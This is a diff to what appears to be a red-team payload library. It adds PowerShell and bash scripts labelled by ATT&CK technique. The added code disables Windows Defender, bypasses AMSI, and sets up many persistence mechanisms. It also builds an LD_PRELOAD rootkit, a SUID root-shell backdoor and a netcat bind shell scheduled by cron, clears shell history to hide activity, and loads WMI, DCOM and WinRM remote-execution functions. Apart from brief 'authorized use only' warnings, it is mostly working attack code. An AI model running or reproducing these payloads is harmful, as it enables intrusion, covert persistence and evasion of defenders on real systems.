@@ -306,6 +306,723 @@ echo -e "\\n\\033[1;32m[*] Enumeration Complete\\033[0m"`,
                 mitre_id: "T1082"
             },
 
+            advanced_windows_evasion: {
+                command: `# Advanced Windows Defense Evasion
+Write-Host "[*] Advanced Defense Evasion Techniques" -ForegroundColor Red
+
+# Disable Windows Defender Real-time Protection
+Write-Host "\\n[+] Attempting to disable Windows Defender..." -ForegroundColor Yellow
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+    Write-Host "Defender Real-time Protection Disabled" -ForegroundColor Green
+} catch {
+    Write-Host "Failed to disable Defender: $_" -ForegroundColor Red
+}
+
+# Bypass AMSI (AntiMalware Scan Interface)
+Write-Host "\\n[+] AMSI Bypass Attempt..." -ForegroundColor Yellow
+$a = 'System.Management.Automation.A' + 'msiUtils'
+$b = [Ref].Assembly.GetType($a)
+$c = $b.GetField('amsiInitFailed','NonPublic,Static')
+$c.SetValue($null,$true)
+Write-Host "AMSI Context Modified" -ForegroundColor Green
+
+# Process Hollowing Preparation
+Write-Host "\\n[+] Process Hollowing Setup..." -ForegroundColor Yellow
+$ProcessHollow = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+public class ProcessHollow {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+}
+"@
+
+# Compile and load the class
+try {
+    Add-Type -TypeDefinition $ProcessHollow -Language CSharp
+    Write-Host "Process Hollowing Functions Loaded" -ForegroundColor Green
+} catch {
+    Write-Host "Failed to load process functions" -ForegroundColor Red
+}
+
+# Registry Persistence with Obfuscation
+Write-Host "\\n[+] Advanced Registry Persistence..." -ForegroundColor Yellow
+$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Start-Process calc.exe"))
+$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+$regName = "SecurityUpdate" + (Get-Random -Maximum 9999)
+
+try {
+    New-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedCommand" -Force
+    Write-Host "Registry Persistence Established: $regName" -ForegroundColor Green
+} catch {
+    Write-Host "Registry modification failed" -ForegroundColor Red
+}
+
+# Token Manipulation
+Write-Host "\\n[+] Token Manipulation..." -ForegroundColor Yellow
+$TokenManip = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+public class TokenManipulation {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+    
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
+    
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+}
+"@
+
+try {
+    Add-Type -TypeDefinition $TokenManip -Language CSharp
+    Write-Host "Token Manipulation Functions Ready" -ForegroundColor Green
+} catch {
+    Write-Host "Token functions load failed" -ForegroundColor Red
+}
+
+Write-Host "\\n[*] Advanced Evasion Setup Complete" -ForegroundColor Red
+Write-Host "[WARNING] Use only in authorized environments!" -ForegroundColor Yellow`,
+                description: "Advanced Windows defense evasion including AMSI bypass, process hollowing, and token manipulation.",
+                complexity: "expert",
+                platform: "windows",
+                type: "powershell",
+                category: "Defense Evasion",
+                tags: ["amsi-bypass", "process-hollowing", "token-manipulation", "defender-bypass"],
+                mitre_id: "T1055"
+            },
+
+            linux_privilege_escalation: {
+                command: `#!/bin/bash
+# Advanced Linux Privilege Escalation
+echo -e "\\033[1;31m[*] Advanced Linux Privilege Escalation\\033[0m"
+
+# Kernel Exploits Check
+echo -e "\\n\\033[1;34m[+] Kernel Exploit Detection:\\033[0m"
+kernel_version=$(uname -r)
+echo "Kernel Version: $kernel_version"
+
+# Check for known vulnerable kernels
+if [[ "$kernel_version" =~ ^3\\.13\\. ]]; then
+    echo -e "\\033[1;31m[!] Potentially vulnerable to CVE-2014-0038 (recvmmsg)\\033[0m"
+fi
+
+if [[ "$kernel_version" =~ ^4\\.[4-5]\\. ]]; then
+    echo -e "\\033[1;31m[!] Potentially vulnerable to CVE-2017-16995 (eBPF)\\033[0m"
+fi
+
+# Advanced SUID/SGID Enumeration
+echo -e "\\n\\033[1;34m[+] Advanced SUID/SGID Analysis:\\033[0m"
+find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null | while read file; do
+    if command -v "$file" &> /dev/null; then
+        echo -e "\\033[1;33m[+] Binary: $file\\033[0m"
+        # Check if binary has known escalation methods
+        case "$(basename "$file")" in
+            "nmap"|"vim"|"nano"|"less"|"more"|"man"|"awk"|"find"|"xargs")
+                echo -e "\\033[1;31m    [!] Potential GTFOBins escalation vector\\033[0m"
+                ;;
+        esac
+    fi
+done
+
+# Capability Enumeration
+echo -e "\\n\\033[1;34m[+] File Capabilities:\\033[0m"
+getcap -r / 2>/dev/null | head -20
+
+# Docker Escape Check
+echo -e "\\n\\033[1;34m[+] Container Escape Vectors:\\033[0m"
+if [ -f /.dockerenv ]; then
+    echo -e "\\033[1;31m[!] Running in Docker container\\033[0m"
+    
+    # Check for privileged container
+    if [ -c /dev/kmsg ]; then
+        echo -e "\\033[1;31m[!] Privileged container detected\\033[0m"
+    fi
+    
+    # Check for docker socket
+    if [ -S /var/run/docker.sock ]; then
+        echo -e "\\033[1;31m[!] Docker socket accessible\\033[0m"
+    fi
+fi
+
+# Advanced Cron Job Analysis
+echo -e "\\n\\033[1;34m[+] Advanced Cron Analysis:\\033[0m"
+for cron_dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly; do
+    if [ -d "$cron_dir" ]; then
+        echo "Checking $cron_dir:"
+        ls -la "$cron_dir" 2>/dev/null | grep -v total
+    fi
+done
+
+# Writable Service Files
+echo -e "\\n\\033[1;34m[+] Writable Service Files:\\033[0m"
+find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null
+
+# Environment Variable Hijacking
+echo -e "\\n\\033[1;34m[+] Environment Hijacking Opportunities:\\033[0m"
+echo "PATH: $PATH"
+echo "LD_PRELOAD: $LD_PRELOAD"
+echo "LD_LIBRARY_PATH: $LD_LIBRARY_PATH"
+
+# Check for writable directories in PATH
+IFS=':' read -ra ADDR <<< "$PATH"
+for dir in "${ADDR[@]}"; do
+    if [ -w "$dir" ]; then
+        echo -e "\\033[1;31m[!] Writable PATH directory: $dir\\033[0m"
+    fi
+done
+
+# Memory Analysis
+echo -e "\\n\\033[1;34m[+] Memory Protection Analysis:\\033[0m"
+cat /proc/sys/kernel/randomize_va_space 2>/dev/null && echo " (ASLR Status)"
+cat /proc/sys/kernel/exec-shield 2>/dev/null && echo " (ExecShield Status)"
+
+# Advanced File Permission Analysis
+echo -e "\\n\\033[1;34m[+] Advanced Permission Analysis:\\033[0m"
+find / -type f \\( -name "*.conf" -o -name "*.config" -o -name "*.cfg" \\) -readable 2>/dev/null | head -10
+
+echo -e "\\n\\033[1;32m[*] Privilege Escalation Analysis Complete\\033[0m"`,
+                description: "Advanced Linux privilege escalation enumeration including kernel exploits, container escapes, and capability analysis.",
+                complexity: "expert",
+                platform: "linux",
+                type: "bash",
+                category: "Privilege Escalation",
+                tags: ["kernel-exploits", "container-escape", "capabilities", "suid-analysis"],
+                mitre_id: "T1068"
+            },
+
+            windows_persistence_advanced: {
+                command: `# Advanced Windows Persistence Mechanisms
+Write-Host "[*] Advanced Persistence Implementation" -ForegroundColor Cyan
+
+# WMI Event Subscription Persistence
+Write-Host "\\n[+] WMI Event Subscription Persistence..." -ForegroundColor Yellow
+$filterName = "SecurityFilter" + (Get-Random -Maximum 9999)
+$consumerName = "SecurityConsumer" + (Get-Random -Maximum 9999)
+
+# Create WMI Event Filter
+$filterArgs = @{
+    Name = $filterName
+    EventNameSpace = 'root\\cimv2'
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+}
+
+try {
+    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments $filterArgs
+    Write-Host "WMI Filter Created: $filterName" -ForegroundColor Green
+} catch {
+    Write-Host "WMI Filter creation failed" -ForegroundColor Red
+}
+
+# Create WMI Event Consumer
+$consumerArgs = @{
+    Name = $consumerName
+    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command \\"Start-Process calc.exe\\""
+}
+
+try {
+    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $consumerArgs
+    Write-Host "WMI Consumer Created: $consumerName" -ForegroundColor Green
+} catch {
+    Write-Host "WMI Consumer creation failed" -ForegroundColor Red
+}
+
+# Service Persistence with Binary Path Modification
+Write-Host "\\n[+] Service Persistence Implementation..." -ForegroundColor Yellow
+$serviceName = "SecurityService" + (Get-Random -Maximum 9999)
+$binaryPath = "C:\\Windows\\System32\\calc.exe"
+
+try {
+    New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName "Security Update Service" -StartupType Automatic
+    Write-Host "Malicious Service Created: $serviceName" -ForegroundColor Green
+} catch {
+    Write-Host "Service creation failed" -ForegroundColor Red
+}
+
+# COM Hijacking Persistence
+Write-Host "\\n[+] COM Object Hijacking..." -ForegroundColor Yellow
+$clsid = "{" + [System.Guid]::NewGuid().ToString() + "}"
+$comPath = "HKCU:\\Software\\Classes\\CLSID\\$clsid\\InprocServer32"
+
+try {
+    New-Item -Path $comPath -Force | Out-Null
+    Set-ItemProperty -Path $comPath -Name "(Default)" -Value "C:\\Windows\\System32\\calc.exe"
+    Write-Host "COM Hijack Registered: $clsid" -ForegroundColor Green
+} catch {
+    Write-Host "COM registration failed" -ForegroundColor Red
+}
+
+# Startup Folder Persistence
+Write-Host "\\n[+] Startup Folder Persistence..." -ForegroundColor Yellow
+$startupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\security.bat"
+$batchContent = @"
+@echo off
+start /b powershell.exe -WindowStyle Hidden -Command "Start-Process calc.exe"
+exit
+"@
+
+try {
+    $batchContent | Out-File -FilePath $startupPath -Encoding ASCII
+    Write-Host "Startup persistence established: $startupPath" -ForegroundColor Green
+} catch {
+    Write-Host "Startup persistence failed" -ForegroundColor Red
+}
+
+# Logon Script Persistence
+Write-Host "\\n[+] Logon Script Persistence..." -ForegroundColor Yellow
+$logonScript = "HKCU:\\Environment"
+$scriptCommand = "powershell.exe -WindowStyle Hidden -Command \\"Start-Process calc.exe\\""
+
+try {
+    Set-ItemProperty -Path $logonScript -Name "UserInitMprLogonScript" -Value $scriptCommand
+    Write-Host "Logon script persistence established" -ForegroundColor Green
+} catch {
+    Write-Host "Logon script persistence failed" -ForegroundColor Red
+}
+
+# Image File Execution Options (IFEO) Persistence
+Write-Host "\\n[+] IFEO Debugger Persistence..." -ForegroundColor Yellow
+$targetBinary = "notepad.exe"
+$ifeoPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$targetBinary"
+
+try {
+    if (!(Test-Path $ifeoPath)) {
+        New-Item -Path $ifeoPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $ifeoPath -Name "Debugger" -Value "calc.exe"
+    Write-Host "IFEO Debugger set for $targetBinary" -ForegroundColor Green
+} catch {
+    Write-Host "IFEO persistence failed (requires admin)" -ForegroundColor Red
+}
+
+# PowerShell Profile Persistence
+Write-Host "\\n[+] PowerShell Profile Persistence..." -ForegroundColor Yellow
+$profilePath = $PROFILE.AllUsersAllHosts
+
+try {
+    $maliciousProfile = 'Start-Process calc.exe -WindowStyle Hidden'
+    if (Test-Path $profilePath) {
+        Add-Content -Path $profilePath -Value "\\n$maliciousProfile"
+    } else {
+        New-Item -Path $profilePath -ItemType File -Force | Out-Null
+        Set-Content -Path $profilePath -Value $maliciousProfile
+    }
+    Write-Host "PowerShell profile modified: $profilePath" -ForegroundColor Green
+} catch {
+    Write-Host "Profile persistence failed" -ForegroundColor Red
+}
+
+Write-Host "\\n[*] Advanced Persistence Implementation Complete" -ForegroundColor Cyan
+Write-Host "[WARNING] Multiple persistence mechanisms deployed!" -ForegroundColor Red`,
+                description: "Advanced Windows persistence techniques including WMI events, COM hijacking, and service manipulation.",
+                complexity: "expert",
+                platform: "windows",
+                type: "powershell",
+                category: "Persistence",
+                tags: ["wmi-persistence", "com-hijacking", "service-persistence", "ifeo"],
+                mitre_id: "T1546"
+            },
+
+            linux_rootkit_techniques: {
+                command: `#!/bin/bash
+# Advanced Linux Rootkit Techniques
+echo -e "\\033[1;31m[*] Advanced Rootkit Implementation Techniques\\033[0m"
+
+# LD_PRELOAD Rootkit
+echo -e "\\n\\033[1;34m[+] LD_PRELOAD Rootkit Implementation:\\033[0m"
+cat << 'EOF' > /tmp/rootkit.c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
+
+static int (*old_readdir)(DIR *) = NULL;
+
+struct dirent *readdir(DIR *dir) {
+    if (old_readdir == NULL) {
+        old_readdir = dlsym(RTLD_NEXT, "readdir");
+    }
+    
+    struct dirent *result = old_readdir(dir);
+    
+    if (result != NULL && strstr(result->d_name, "rootkit") != NULL) {
+        return readdir(dir);
+    }
+    
+    return result;
+}
+EOF
+
+echo -e "\\033[1;33m[+] Rootkit source created at /tmp/rootkit.c\\033[0m"
+
+# Compile the rootkit
+if command -v gcc &> /dev/null; then
+    gcc -shared -fPIC /tmp/rootkit.c -o /tmp/rootkit.so -ldl 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo -e "\\033[1;32m[+] Rootkit compiled successfully\\033[0m"
+        echo -e "\\033[1;33m    Usage: LD_PRELOAD=/tmp/rootkit.so ls\\033[0m"
+    else
+        echo -e "\\033[1;31m[-] Compilation failed\\033[0m"
+    fi
+else
+    echo -e "\\033[1;31m[-] GCC not available\\033[0m"
+fi
+
+# Kernel Module Information
+echo -e "\\n\\033[1;34m[+] Kernel Module Rootkit Framework:\\033[0m"
+cat << 'EOF' > /tmp/kmod_rootkit.c
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("Educational Rootkit Module");
+
+static unsigned long *sys_call_table;
+
+static int __init rootkit_init(void) {
+    printk(KERN_INFO "Rootkit module loaded\\n");
+    // System call table manipulation would go here
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {
+    printk(KERN_INFO "Rootkit module unloaded\\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+EOF
+
+echo -e "\\033[1;33m[+] Kernel module source created at /tmp/kmod_rootkit.c\\033[0m"
+
+# Process Hiding Techniques
+echo -e "\\n\\033[1;34m[+] Process Hiding Techniques:\\033[0m"
+
+# Create a hidden process name
+hidden_proc_name="[kworker/0:1]"
+echo -e "\\033[1;33m[+] Mimicking kernel thread name: $hidden_proc_name\\033[0m"
+
+# File Hiding with Attribute Manipulation
+echo -e "\\n\\033[1;34m[+] File Hiding Techniques:\\033[0m"
+
+# Create hidden directory with special characters
+hidden_dir="/tmp/.hidden$(printf '\\x00')space"
+mkdir -p "$hidden_dir" 2>/dev/null
+echo -e "\\033[1;33m[+] Hidden directory created (null byte): $hidden_dir\\033[0m"
+
+# SUID Backdoor Installation
+echo -e "\\n\\033[1;34m[+] SUID Backdoor Implementation:\\033[0m"
+cat << 'EOF' > /tmp/backdoor.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+EOF
+
+echo -e "\\033[1;33m[+] SUID backdoor source created\\033[0m"
+
+if command -v gcc &> /dev/null; then
+    gcc /tmp/backdoor.c -o /tmp/backdoor 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo -e "\\033[1;32m[+] Backdoor compiled\\033[0m"
+        echo -e "\\033[1;33m    To activate: chmod +s /tmp/backdoor (requires root)\\033[0m"
+    fi
+fi
+
+# Network Backdoor
+echo -e "\\n\\033[1;34m[+] Network Backdoor Implementation:\\033[0m"
+cat << 'EOF' > /tmp/netbackdoor.sh
+#!/bin/bash
+# Simple network backdoor
+while true; do
+    nc -nlvp 4444 -e /bin/bash 2>/dev/null
+    sleep 5
+done &
+EOF
+
+chmod +x /tmp/netbackdoor.sh
+echo -e "\\033[1;33m[+] Network backdoor created at /tmp/netbackdoor.sh\\033[0m"
+
+# Log Evasion Techniques
+echo -e "\\n\\033[1;34m[+] Log Evasion Setup:\\033[0m"
+
+# Clear bash history
+echo -e "\\033[1;33m[+] History clearing commands:\\033[0m"
+echo "    unset HISTFILE"
+echo "    export HISTFILESIZE=0"
+echo "    history -c"
+echo "    rm ~/.bash_history"
+
+# Timestamp manipulation
+echo -e "\\033[1;33m[+] Timestamp manipulation:\\033[0m"
+echo "    touch -r /etc/passwd malicious_file"
+echo "    touch -t 202301010000 malicious_file"
+
+# Anti-forensics
+echo -e "\\n\\033[1;34m[+] Anti-Forensics Techniques:\\033[0m"
+echo -e "\\033[1;33m[+] Secure deletion:\\033[0m"
+echo "    shred -vfz -n 3 filename"
+echo "    dd if=/dev/urandom of=filename bs=1024 count=filesize"
+
+echo -e "\\n\\033[1;33m[+] Memory dumping prevention:\\033[0m"
+echo "    echo 2 > /proc/sys/kernel/yama/ptrace_scope"
+
+# Persistence via cron
+echo -e "\\n\\033[1;34m[+] Cron Persistence:\\033[0m"
+cron_entry="*/5 * * * * /tmp/netbackdoor.sh"
+echo -e "\\033[1;33m[+] Cron entry example: $cron_entry\\033[0m"
+
+echo -e "\\n\\033[1;31m[*] Rootkit Implementation Guide Complete\\033[0m"
+echo -e "\\033[1;33m[WARNING] All techniques for educational/authorized testing only!\\033[0m"`,
+                description: "Advanced Linux rootkit techniques including LD_PRELOAD hooks, kernel modules, and anti-forensics.",
+                complexity: "expert",
+                platform: "linux",
+                type: "bash",
+                category: "Defense Evasion",
+                tags: ["rootkit", "ld-preload", "kernel-module", "anti-forensics"],
+                mitre_id: "T1014"
+            },
+
+            windows_lateral_movement: {
+                command: `# Advanced Windows Lateral Movement
+Write-Host "[*] Advanced Lateral Movement Techniques" -ForegroundColor Cyan
+
+# SMB Share Enumeration with Advanced Techniques
+Write-Host "\\n[+] Advanced SMB Enumeration..." -ForegroundColor Yellow
+$targets = @("192.168.1.1", "192.168.1.10", "192.168.1.100")
+
+foreach ($target in $targets) {
+    Write-Host "Scanning target: $target" -ForegroundColor Green
+    
+    # Test SMB connectivity
+    try {
+        $shares = Get-SmbShare -CimSession $target -ErrorAction SilentlyContinue
+        if ($shares) {
+            Write-Host "  Available shares on $target:" -ForegroundColor Cyan
+            $shares | Format-Table Name, Path, Description -AutoSize
+        }
+    } catch {
+        Write-Host "  SMB access failed for $target" -ForegroundColor Red
+    }
+}
+
+# PsExec-style Remote Execution
+Write-Host "\\n[+] Remote Command Execution Framework..." -ForegroundColor Yellow
+$remoteExec = @"
+function Invoke-RemoteCommand {
+    param(
+        [string]$ComputerName,
+        [string]$Command,
+        [System.Management.Automation.PSCredential]$Credential
+    )
+    
+    try {
+        \$session = New-PSSession -ComputerName \$ComputerName -Credential \$Credential
+        \$result = Invoke-Command -Session \$session -ScriptBlock { 
+            param(\$cmd) 
+            Invoke-Expression \$cmd 
+        } -ArgumentList \$Command
+        Remove-PSSession \$session
+        return \$result
+    } catch {
+        Write-Error "Remote execution failed: \$_"
+    }
+}
+"@
+
+Invoke-Expression $remoteExec
+Write-Host "Remote execution function loaded" -ForegroundColor Green
+
+# WMI Lateral Movement
+Write-Host "\\n[+] WMI-based Lateral Movement..." -ForegroundColor Yellow
+$wmiLateral = @"
+function Invoke-WMICommand {
+    param(
+        [string]$ComputerName,
+        [string]$Command
+    )
+    
+    try {
+        \$processStartup = ([wmiclass]"\\\\$ComputerName\\root\\cimv2:Win32_ProcessStartup").CreateInstance()
+        \$processStartup.ShowWindow = 0
+        
+        \$process = Get-WmiObject -Class Win32_Process -ComputerName \$ComputerName
+        \$result = \$process.Create(\$Command, null, \$processStartup)
+        
+        if (\$result.ReturnValue -eq 0) {
+            Write-Host "Command executed successfully on \$ComputerName" -ForegroundColor Green
+            Write-Host "Process ID: \$(\$result.ProcessId)" -ForegroundColor Cyan
+        } else {
+            Write-Host "Command execution failed. Return code: \$(\$result.ReturnValue)" -ForegroundColor Red
+        }
+    } catch {
+        Write-Error "WMI execution failed: \$_"
+    }
+}
+"@
+
+Invoke-Expression $wmiLateral
+Write-Host "WMI lateral movement function loaded" -ForegroundColor Green
+
+# DCOM Lateral Movement
+Write-Host "\\n[+] DCOM-based Lateral Movement..." -ForegroundColor Yellow
+$dcomLateral = @"
+function Invoke-DCOMCommand {
+    param(
+        [string]$ComputerName,
+        [string]$Command
+    )
+    
+    try {
+        \$dcomObject = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", \$ComputerName))
+        \$dcomObject.Document.ActiveView.ExecuteShellCommand(\$Command, \$null, \$null, "7")
+        Write-Host "DCOM command executed on \$ComputerName" -ForegroundColor Green
+    } catch {
+        Write-Error "DCOM execution failed: \$_"
+    }
+}
+"@
+
+Invoke-Expression $dcomLateral
+Write-Host "DCOM lateral movement function loaded" -ForegroundColor Green
+
+# Token Impersonation for Lateral Movement
+Write-Host "\\n[+] Token Impersonation Setup..." -ForegroundColor Yellow
+$tokenImpersonation = @"
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+public class TokenManipulator {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+    
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+    
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool RevertToSelf();
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+"@
+
+try {
+    Invoke-Expression $tokenImpersonation
+    Write-Host "Token manipulation functions loaded" -ForegroundColor Green
+} catch {
+    Write-Host "Token manipulation setup failed" -ForegroundColor Red
+}
+
+# Registry-based Lateral Movement
+Write-Host "\\n[+] Registry Remote Access..." -ForegroundColor Yellow
+$registryAccess = @"
+function Access-RemoteRegistry {
+    param(
+        [string]$ComputerName,
+        [string]$RegistryPath
+    )
+    
+    try {
+        \$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', \$ComputerName)
+        \$key = \$reg.OpenSubKey(\$RegistryPath)
+        
+        if (\$key) {
+            Write-Host "Registry access successful on \$ComputerName" -ForegroundColor Green
+            \$key.GetValueNames() | ForEach-Object {
+                Write-Host "  \$_: \$(\$key.GetValue(\$_))" -ForegroundColor Cyan
+            }
+            \$key.Close()
+        }
+        \$reg.Close()
+    } catch {
+        Write-Error "Registry access failed: \$_"
+    }
+}
+"@
+
+Invoke-Expression $registryAccess
+Write-Host "Registry access function loaded" -ForegroundColor Green
+
+# Service-based Lateral Movement
+Write-Host "\\n[+] Service-based Remote Execution..." -ForegroundColor Yellow
+$serviceExecution = @"
+function Invoke-ServiceCommand {
+    param(
+        [string]$ComputerName,
+        [string]$ServiceName,
+        [string]$BinaryPath
+    )
+    
+    try {
+        \$service = Get-WmiObject -Class Win32_Service -ComputerName \$ComputerName -Filter "Name='\$ServiceName'"
+        
+        if (\$service) {
+            \$result = \$service.Change(\$null, \$BinaryPath)
+            if (\$result.ReturnValue -eq 0) {
+                \$service.StartService()
+                Write-Host "Service \$ServiceName modified and started on \$ComputerName" -ForegroundColor Green
+            }
+        } else {
+            # Create new service
+            \$newService = ([wmiclass]"\\\\$ComputerName\\root\\cimv2:Win32_Service").Create(\$BinaryPath, \$ServiceName, \$ServiceName)
+            if (\$newService.ReturnValue -eq 0) {
+                Write-Host "Service \$ServiceName created on \$ComputerName" -ForegroundColor Green
+            }
+        }
+    } catch {
+        Write-Error "Service execution failed: \$_"
+    }
+}
+"@
+
+Invoke-Expression $serviceExecution
+Write-Host "Service execution function loaded" -ForegroundColor Green
+
+Write-Host "\\n[*] Lateral Movement Framework Loaded" -ForegroundColor Cyan
+Write-Host "[WARNING] Use only on authorized systems!" -ForegroundColor Red
+
+# Usage examples
+Write-Host "\\n[+] Usage Examples:" -ForegroundColor Yellow
+Write-Host "  Invoke-RemoteCommand -ComputerName 'target' -Command 'whoami' -Credential \$cred" -ForegroundColor Cyan
+Write-Host "  Invoke-WMICommand -ComputerName 'target' -Command 'calc.exe'" -ForegroundColor Cyan
+Write-Host "  Invoke-DCOMCommand -ComputerName 'target' -Command 'notepad.exe'" -ForegroundColor Cyan`,
+                description: "Advanced Windows lateral movement techniques including WMI, DCOM, and service-based execution.",
+                complexity: "expert",
+                platform: "windows",
+                type: "powershell",
+                category: "Lateral Movement",
+                tags: ["wmi-execution", "dcom", "service-execution", "token-impersonation"],
+                mitre_id: "T1021"
+            }
+
             powershell_obfuscation: {
                 command: `# PowerShell Obfuscation Techniques
 Write-Host "[*] PowerShell Obfuscation Examples" -ForegroundColor Cyan
@@ -569,12 +1286,16 @@ Write-Host "\`n[CRITICAL] Unauthorized data exfiltration is illegal!" -Foregroun
             basic: ['system_info', 'network_scan'],
             network: ['network_scan'],
             filesystem: ['data_exfiltration'],
-            edr: ['powershell_obfuscation'],
-            persistence: ['persistence_registry'],
-            privilege: ['privilege_escalation'],
+            edr: ['powershell_obfuscation', 'advanced_windows_evasion'],
+            persistence: ['persistence_registry', 'windows_persistence_advanced'],
+            privilege: ['privilege_escalation', 'linux_privilege_escalation'],
             credentials: ['credential_dump'],
             exfiltration: ['data_exfiltration'],
-            linux: ['linux_enumeration']
+            linux: ['linux_enumeration', 'linux_privilege_escalation', 'linux_rootkit_techniques'],
+            lateral: ['windows_lateral_movement'],
+            rootkit: ['linux_rootkit_techniques'],
+            av_bypass: ['advanced_windows_evasion'],
+            memory: ['windows_lateral_movement']
         };
 
         const payloadKeys = sectionMap[sectionId] || Object.keys(this.payloads);
